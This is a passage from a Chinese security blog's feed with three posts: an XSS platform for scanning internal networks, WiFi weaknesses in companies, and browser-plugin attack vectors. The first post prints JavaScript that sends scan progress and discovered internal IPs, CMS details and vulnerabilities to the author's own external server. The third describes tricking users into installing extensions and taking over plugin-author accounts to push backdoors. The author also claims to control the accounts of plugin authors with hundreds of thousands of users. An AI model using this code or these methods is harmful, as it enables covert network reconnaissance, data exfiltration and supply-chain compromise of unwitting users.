class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">    updataStage.setAttribute(<span class="string">"src"</span>,<span class="string">"http://webrtcxss.cn/Api/stage/onlystring/"</span>+onlyString+<span class="string">"/updata/"</span>+num);</div><div class="line">    updataStage.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(updataStage);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>就是一个img标签，发送get请求到服务端，告诉服务端代码运行到哪里了。在平台中的反馈如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/13.png" alt=""></p><blockquote><h3 id="0x09-API后端代码："><a href="#0x09-API后端代码：" class="headerlink" title="0x09 API后端代码："></a>0x09 API后端代码：</h3></blockquote><p>后端使用了thinkphp框架。如果你想修改服务端接受的方式的话。<br>请在/Application/Home/Controller目录下修改ApiController.class.php文件，就行了。里面的内容分为survivalIp、survivalPortIp、_empty、survivalCmsIp、existenceVul、stage模块。可根据JavaScript中的代码来做出相应的修改。如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/14.png" alt=""></p><blockquote><h3 id="0x10平台专属的API："><a href="#0x10平台专属的API：" class="headerlink" title="0x10平台专属的API："></a>0x10平台专属的API：</h3></blockquote><p>平台的api在<code>/Application/Home/Controller</code>目录下的RootApiController.class.php文件里。<br>建立项目、删除项目、查询项目都在里面。如果你想修改JavaScript代码，就在建立项目中修改，如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/15.png" alt=""></p><p>修改起来很简单。<br>平台运行起来如下图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/16.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/17.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/18.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/19.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/20.png" alt=""></p><blockquote><h3 id="0x11数据库的结构："><a href="#0x11数据库的结构：" class="headerlink" title="0x11数据库的结构："></a>0x11数据库的结构：</h3></blockquote><p>一共具有7个表，如下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/21.png" alt=""></p><ol><li><code>webrtc_cmspath</code>用于存放检测cms类型的JavaScript路径</li><li><code>webrtc_cmsvul用于存放cms</code>的getshell漏洞详情</li><li><code>webrtc_existencecmsip</code>用于存放内网中哪些IP具有cms</li><li><code>webrtc_existencevul</code>用于存放内网中哪些IP具有的CMS有漏洞</li><li><code>webrtc_ipdatalist</code>用于存放内网中所有开放80端口切具有站点的ip列表</li><li><code>webrtc_project</code>用于存放项目信息</li><li><code>webrtc_survivaliplist</code>用于存放当前主机的内网ip</li></ol><blockquote><h3 id="0x12特殊的玩法："><a href="#0x12特殊的玩法：" class="headerlink" title="0x12特殊的玩法："></a>0x12特殊的玩法：</h3></blockquote><p>之前在freebuf说过了，地址是：<a href="http://www.freebuf.com/articles/web/61268.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/61268.html</a><br>因为nginx或者apache有些管理员会使用日志看实时查看网站的流量，由于log日志看起来太丑，于是就有人想出web端实时的反馈网站流量。但是在记录user-agent等数据包格式的时候，没有做好过滤。从而导致攻击者修改自己的user-agent为XSS攻击字符串，再进行浏览网站的操作，网站管理员在查看的时候就会触发XSS，如果配合本章所讲的内容。就像下雨天吃着巧克力一样完美。其实并不一定非要是nginx或者apache，有些网站的后台写的程序中会使用后端语言而非nginx这种配置生成文件，他们会直接记录下你们的IP、user-agent。从而在后台方便查看。这个时候我们本章所说的内容就会排上用场。<br>关于插件安全的话，请大家看下面这张图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/22.png" alt=""></p><p>我控制了十多个maxthon插件作者的账户，现在具有30w的插件用户，而我可以随时随地的更改其中的代码，而我问了一下maxthon插件的官方人员，答复是：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/23.png" alt=""></p><p>即使你没有相关的插件作者用户。可以使用组简单的html+swf来写一个插件小游戏，一个星期就可以上千。这里我打个比方，10w用户都安装了我的插件。<br>其中5w是已经工作的用户。2w是在公司电脑上使用maxthon并安装了插件，一旦打开maxthon浏览器，插件就会自动运行。而当插件发现有新版本时，会自动静默安装。然后就会运行我们的JavaScript代码，而我在0x03节的地方说到maxthon也是支持WebRTC的，但是这里会有坑。我不清楚是不是由版本引起的问题，在chrome下运行WebRTC代码时会显示一组IP，也是当前电脑的内网IP，而在maxthon下，会出现三组，可能不止三组。如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/24.png" alt=""></p><p>其中192.168.27.1是我电脑上的VM虚拟机的IP段。192.168.118.1也是VM虚拟机上的ip段。只有192.168.1.104才是当前真正的内网IP。所以在源程序里会出现join函数和对ipList变量的for循环。</p><blockquote><h3 id="0x13失败的思路："><a href="#0x13失败的思路：" class="headerlink" title="0x13失败的思路："></a>0x13失败的思路：</h3></blockquote><p><strong>思路一、</strong></p><p>假设这里获取到的内网IP为192.168.21.104。根据for循环输出img、script标签可以获取到内网的所以存活IP地址（也可以探测port），但是这里有一个问题，就是JavaScript里怎么获取到其他内网的资源信息，因为跨域，ajax、iframe都不行。我昨天晚上问了0xJin，他是没有获取，只是扫的存活IP及端口。但是说好是内网漫游，不能只获取到当前触发XSS的Pc。昨天晚上查了一夜的资料，有个思路，但是不知道能不能实现。这里说明一下，如果有什么好的建议可以提出来。当然思路可能错误。 </p><p>前面的跳过，假设现在已经有了内网中开放80端口的IP。<br>既然ajax、iframe都不行，那我们可以尝试一下flash来获取，但是flash也有相应的crossdomain.xml限制，但是今天上午查资料的时候找到了这么一篇文章：<a href="http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data" target="_blank" rel="external">http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data</a><br>根据作者所说，这个方法只能获取到视觉对象（图片、swf），也就是说无法获取存活IP里的html源码了。</p><p>我想是否可以使用flash发送一个带有XSS的URL（内网IP）<br>XSS里调用Html2canvas插件来把存活IP中的网站截图发送给我们的服务器端。<br>当然了，这里有一个限制条件，就是必须获取存活IP中网站的cms信息（可以使用<code>&lt;img src=&quot;内网IP/favicon.ico&quot;&gt;</code>再把图片发送给远程服务器，来接受。这样就可以判断属于哪个cms类型的了，构架代码的时候可以加一个定时获取远程服务器的JavaScript代码，这样我们看到是cms类型后，就可以在网上找相应的爆版本信息的方法，写成代码，等待客服端的定时任务获取到）。 </p><p>现在信息有了，还有一个条件，就是XSS漏洞，需要XSS漏洞来加载Html2canvas插件，并且保存成图片发送给远程的服务器。 </p><p>问题来了，反射XSS并不是正真的打开网站，而是发送get请求。那canvas并不会加载，也就说图片获取失败。储蓄型的话可能成功。 </p><p>失败的原因：</p><ol><li><p>canvas无法获取到iframe里的DOM内容</p></li><li><p>img无法发送到远程服务器，因为调用img图片的时候，当前页面和img的图片不是同源的，无法发送</p></li><li><p>隐蔽性很差</p></li></ol><p><strong> 思路二、</strong></p><p>之前我提到的思路是使用xss+iframe+canvas，但是@超威蓝猫 说到canvas无法截取到iframe里的内容，后来我上网查后，确实如此（基础不牢的结果）。后来我又有了一个新的思路，使用<code>&lt;img src=&quot;https://xxx.xxx.xxx.xxx/favico.ico&quot; /&gt;</code>来获取网站的cms信息，因为不同的cms他们的ico图标也是不一样的，把img发送到服务器端后，就可以识别网站属于哪种cms类型了。但是后来和伟哥 @呆子不开口 讨论了几个小时，发现忽略了一个重要的问题，怎么把img发送到远程服务器，img图片地址不是同源的，而且怎么把图片使用JavaScript转成二进制数据。这个思路又断了。伟哥提到一个很nice的解决方案，检测js脚本，也就是<code>&lt;script src=&quot;http://xxx.xxx.xxx.xxx/path/cms.js&quot; onload=&quot;xxx(this)&quot;&gt;&lt;/script&gt;</code>这样的话，我就需要大量cms独立的js文件位置。工作量大。我本来都打算使用这个了，但是前几天闲的无聊翻自己的QQ日志时，发现了一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"visibilitychange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.title = <span class="built_in">document</span>.hidden ? <span class="string">'iloveyou'</span> : <span class="string">'metoo'</span>;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>这是HTML5推出的API，我发现我可以利用这个API来达到神不知鬼不觉的上传图片。首先当用户切换到其他浏览器标签的时候，document.hidden会为true。那么我们就可以确定用户没有访问我们XSS的网页。那么我们干什么用户都不会发现了。大致的思路如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"visibilitychange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.hidden)&#123;</div><div class="line">        <span class="keyword">var</span> htmlText = $(<span class="string">"body"</span>).html();</div><div class="line">        $(<span class="string">"body"</span>).empty();</div><div class="line">        $(<span class="string">"body"</span>).append(<span class="string">"&lt;img src='http://xxx.xxx.xxx.xxx/favico.ico' /&gt;"</span>);</div><div class="line">        <span class="comment">//canvas获取页面，请移步：http://leobluewing.iteye.com/blog/2020145</span></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $(<span class="string">"body"</span>).empty();</div><div class="line">        $(<span class="string">"body"</span>).append(htmlText);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>失败的原因：</p><ol><li><p>因为之前提到过img加载太消耗时间，尤其在maxthon浏览器下，三组以上的IP地址全部检测完成需要30分钟左右。如果用此方法的话，需要确保用户在半个小时内不能打开此页面</p></li><li><p>canvas无法获得不是本源的图片，也就是说不能获取到img加载的图片</p></li></ol><p>总结后，就采用了伟哥的方法。</p><blockquote><h3 id="0x14结尾："><a href="#0x14结尾：" class="headerlink" title="0x14结尾："></a>0x14结尾：</h3></blockquote><p>在此尤其感谢，@呆子不开口 。这篇文章写的很累，因为img标签发送的耗时长的问题，导致每一次修改BUG的时候，都需要等9-10分钟。也是我目前为止写的时间最长的一篇文章。因为要学驾照，时间更少了。大概花了一个月左右的时间。之前和主编约稿的日期是15日，一直拖到现在，挺对不住的。前端、后端、数据库还有些的BUG没有修复，如果此平台的安装量达到1000会继续更新，下面是平台下载的url：<br><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="external">https://github.com/BlackHole1/WebRtcXSS</a></p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0x01-前言：&quot;&gt;&lt;a href=&quot;#0x01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言：&quot;&gt;&lt;/a&gt;0x01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。&lt;/p&gt;
&lt;p&gt;直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-076685&quot;&gt;http://www.wooyun.org/bugs/wooyun-2014-076685&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。&lt;/p&gt;
&lt;p&gt;而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x02构架：&quot;&gt;&lt;a href=&quot;#0x02构架：&quot; class=&quot;headerlink&quot; title=&quot;0x02构架：&quot;&gt;&lt;/a&gt;0x02构架：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; onlyString           = &lt;span class=&quot;string&quot;&gt;&quot;abc&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ipList               = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; survivalIpLIst       = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; deathIpLIst          = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; sendsurvivalIp       = &lt;span class=&quot;string&quot;&gt;&quot;http://webrtcxss.cn/Api/survivalIp&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; snedIteratesIpUrl    = &lt;span class=&quot;string&quot;&gt;&quot;http://webrtcxss.cn/Api/survivalPortIp&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; snedIteratesCmsIpUrl = &lt;span class=&quot;string&quot;&gt;&quot;http://webrtcxss.cn/Api/survivalCmsIp&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; sendExistenceVul     = &lt;span class=&quot;string&quot;&gt;&quot;http://webrtcxss.cn/Api/existenceVul&quot;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>公司wifi安全</title>
    <link href="http://bugs.cc/2016/12/13/%E5%85%AC%E5%8F%B8wifi%E5%AE%89%E5%85%A8/"/>
    <id>http://bugs.cc/2016/12/13/公司wifi安全/</id>
    <published>2016-12-13T03:00:48.000Z</published>
    <updated>2016-12-15T03:38:16.854Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x0-前言："><a href="#0x0-前言：" class="headerlink" title="0x0 前言："></a>0x0 前言：</h4><hr><p>很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。</p><h4 id="0x1-无线安全："><a href="#0x1-无线安全：" class="headerlink" title="0x1 无线安全："></a>0x1 无线安全：</h4><hr><p>很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。</p><p>很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。</p><p>当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。</p><p>因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。<br><a id="more"></a><br>连不上网对黑客来说没有什么问题。我给某公司做安全检测的时候，万能钥匙破解—中间人嗅探。不到两分钟拿到了他们公司官网后台管理员的权限。</p><p>WEB认证在我看来不是针对于黑客的，是针对于员工的，因为黑客不需要外网资源，但是员工需要。<br>下面是我画的图：<br><img src="http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/1.png" alt=""></p><p><a href="https://www.processon.com/view/556d3cd0e4b09c41cc41b26e" target="_blank" rel="external">思维导图URL</a></p><p>黑客连入WIFI后，虽然WEB二次认证不了，但是黑客现在已经处于内网中，他可以访问内网的任何资源。</p><p>修复建议：</p><ol><li><p>把WPA/WPA2无线认证换成802.1x认证方式（802.1x无线认证方式需要交换机的支持）</p></li><li><p>买针对无线检测/防御设备</p></li><li><p>无线不能访问内网资源，只有有线可以访问内网资源（从物理上隔绝问题）</p></li></ol><p>关于802.1x认证方式，他的原理图是下面这样的:</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/2.png" alt=""></p><p><a href="http://www.processon.com/view/link/556d5c6be4b09c41cc43c0e3" target="_blank" rel="external">思维导图URL</a></p><p>黑客即使连上公司WIFI，但是无法通过802.1x认证，导致</p><p>公司设备（路由器、交换机）无法分配给你内网IP和外网出口IP的资格。   </p><h4 id="0x2-较为深入无线安全："><a href="#0x2-较为深入无线安全：" class="headerlink" title="0x2 较为深入无线安全："></a>0x2 较为深入无线安全：</h4><hr><p>像上面所讲，只是针对公司开放的WIFI进行管理。</p><p>而上面的三个解决方案，只有第一个相比之下是比较方便还不用花钱的（机房设备需要支持802.1x无线协议，不支持还是要花钱）。</p><p>第二个，公司如果不想花钱是不会选择的，而且买了还要配置，前期工作量特别大。</p><p>第三个，工作量大，需要重新架构公司网络，我和一个同事在下午6点下班后一直忙到第二天上班之前才搞定。</p><p>如果公司不想花钱或者运维不想重新架构的话，第一种是很好的选择，但是这里又有一个问题，360/百度随身WIFI，这个东西的存在，对那些本来就不怎么安全的公司更是雪上加霜。</p><p>360/百度随身WIFI插入公司电脑后，会开启ICS服务，加上自带的无线网卡AP功能。当你连上这个随身WIFI之后，相当于一个小型的局域网。这时我们可以先入侵那个插了随身WIFI的PC电脑，通过它来入侵整个公司。如果你只需要某个接口，则不需要入侵插了随身WIFI的PC电脑。这里假设下“我需要的是这个网站的后台，可是想要登陆这个网站后台，需要出口IP是这个公司的外网IP”这样的话，我们则不需要入侵插了随身WIFI的PC电脑来。为什么呢？我画了一个图，大家看下:</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/3.png" alt=""></p><p><a href="https://www.processon.com/view/556d175ee4b0546a904aa2bb" target="_blank" rel="external">思维导图URL</a></p><p>黑客连入WIFI后，无需进行WEB二次认证，因为它使用的是员工的网络，员工也肯定认证过了，员工使用的是公司内网，内网有个统一的出口IP，而服务器端也只认这个IP，其他IP连不上服务器。</p><p>解决办法，网上很多，可以参考网上的教程。</p><p>如果你又更好的解决方案，可以提出来。我个人的思路有限。有不足之处，还望见谅。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。&lt;/p&gt;
&lt;h4 id=&quot;0x1-无线安全：&quot;&gt;&lt;a href=&quot;#0x1-无线安全：&quot; class=&quot;headerlink&quot; title=&quot;0x1 无线安全：&quot;&gt;&lt;/a&gt;0x1 无线安全：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。&lt;/p&gt;
&lt;p&gt;很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。&lt;/p&gt;
&lt;p&gt;当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。&lt;/p&gt;
&lt;p&gt;因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。&lt;br&gt;
    
    </summary>
    
    
      <category term="无线安全" scheme="http://bugs.cc/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浏览器插件的攻击向量</title>
    <link href="http://bugs.cc/2016/10/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/"/>
    <id>http://bugs.cc/2016/10/05/浏览器插件的攻击向量/</id>
    <published>2016-10-05T12:35:52.000Z</published>
    <updated>2016-10-31T09:26:48.103Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x0-前言："><a href="#0x0-前言：" class="headerlink" title="0x0 前言："></a>0x0 前言：</h4><hr><p>我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。</p><h4 id="0x1-让自己变成攻击者："><a href="#0x1-让自己变成攻击者：" class="headerlink" title="0x1 让自己变成攻击者："></a>0x1 让自己变成攻击者：</h4><hr><p>我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。</p><p>在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。</p><p>大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：</p><blockquote><p>在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”</p><p>被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装</p><p>基于社工库控制插件作者的账户，加入后门代码，更新插件</p><p>控制插件里调用的第三方javascript代码</p></blockquote><p>现在有四种方法供我们选择，我们一个个来进行介绍。<br><a id="more"></a></p><h5 id="0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”"><a href="#0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”" class="headerlink" title="0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”"></a>0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”</h5><p>这个方法类似于之前的问题<a href="http://www.cnbeta.com/articles/470593.htm" target="_blank" rel="external">强迫安装恶意Chrome扩展 攻击者使用激进方式</a>。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。</p><h6 id="0x1-1-1-检测是否安装了某插件"><a href="#0x1-1-1-检测是否安装了某插件" class="headerlink" title="0x1.1.1 检测是否安装了某插件"></a>0x1.1.1 检测是否安装了某插件</h6><p>我们先把这个攻击方式的代码目录架构进行说明：</p><p>网站页面:<code>index.html</code></p><p>插件目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">icons/              插件的logo存放目录</div><div class="line"></div><div class="line">icons/icons.svg     插件logo文件</div><div class="line"></div><div class="line">def.json            插件的主控制文件，里面存着整个插件的配置</div><div class="line">代码如下:</div><div class="line">[</div><div class="line">    &#123;</div><div class="line">        &quot;type&quot;: &quot;extension&quot;,</div><div class="line">        &quot;frameworkVersion&quot;:&quot;1.0.0&quot;,</div><div class="line">        &quot;version&quot;:&quot;1.0.0&quot;,</div><div class="line">        &quot;guid&quot;: &quot;&#123;7c321680-7673-484c-bcc4-de10f453cb8e&#125;&quot;,</div><div class="line">        &quot;name&quot;: &quot;plug_setup&quot;,</div><div class="line">        &quot;author&quot;: &quot;Black-Hole&quot;,</div><div class="line">        &quot;svg_icon&quot;:&quot;icon.svg&quot;,</div><div class="line">        &quot;title&quot;: &#123;</div><div class="line">            &quot;zh-cn&quot;: &quot;欺骗用户安装插件&quot;</div><div class="line">        &#125;,</div><div class="line">        &quot;description&quot;:&#123;</div><div class="line">            &quot;zh-cn&quot;:&quot;欺骗用户安装插件&quot;</div><div class="line">        &#125;,</div><div class="line">        &quot;main&quot;:&quot;index.html&quot;,</div><div class="line">        &quot;actions&quot;: [</div><div class="line">            &#123;</div><div class="line">                &quot;type&quot;: &quot;script&quot;,</div><div class="line">                &quot;entryPoints&quot;: [</div><div class="line">                    &quot;doc_onload&quot;</div><div class="line">                ],</div><div class="line">                &quot;js&quot;: [</div><div class="line">                    &quot;base.js&quot;</div><div class="line">                ],</div><div class="line">        &quot;include&quot;: [&quot;*&quot;],</div><div class="line">        &quot;includeFrames&quot;: true</div><div class="line">             &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">]</div><div class="line">base.js             每打开一个页面，要执行的JavaScript代码</div><div class="line">代码如下:</div><div class="line">后文会提到</div></pre></td></tr></table></figure></p><p>我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">chrome.runtime.onMessage.addListener(<span class="function"><span class="keyword">function</span> (<span class="params">request, sender, sendResponse</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(request.act == <span class="string">'ping'</span>)&#123;</div><div class="line">        sendResponse(&#123;<span class="string">"act"</span>: <span class="string">"tong"</span>&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line">chrome.runtime.sendMessage(<span class="string">"extensionId"</span>, &#123;<span class="string">"act"</span>: <span class="string">"ping"</span>&#125;, <span class="function"><span 